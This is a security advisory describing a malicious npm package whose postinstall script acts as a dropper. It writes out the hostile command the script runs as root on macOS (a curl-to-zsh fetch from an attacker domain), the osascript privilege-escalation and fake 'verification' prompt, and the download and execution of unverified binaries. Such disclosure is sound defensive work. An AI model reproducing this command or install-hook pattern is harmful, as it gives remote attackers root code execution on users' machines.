summary: postinstall fetches and executes remote shell as root from attacker-controlled domain
details: On npm install, install.cjs runs a postinstall lifecycle script that, on macOS, writes an AppleScript to /tmp and invokes /usr/bin/osascript with 'with administrator privileges' to run `curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh` as root. The domain update.apex-arena-router.com is unrelated to the package's declared repository (github.com/can1357/oh-my-pi) and homepage, the URL is unpinned, and no hash or signature verification is performed on the fetched shell code. A console message frames the resulting admin password dialog as 'verification' to social-engineer approval of the root privilege prompt. On all platforms, the same script additionally downloads a platform-specific binary apex-<target>[.exe] (and a.node native addon on Windows) from github.com/Apex-Foundation/copilot releases pinned to v1.0.0 — a repository that does not match the declared publisher and a version that is decoupled from the package version (1.0.32) — then chmod 0755 and executes it. The combined behavior is a multi-stage dropper: arbitrary remote code executes as root on macOS installers, and an unverified binary from a non-publisher GitHub org executes on every platform.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
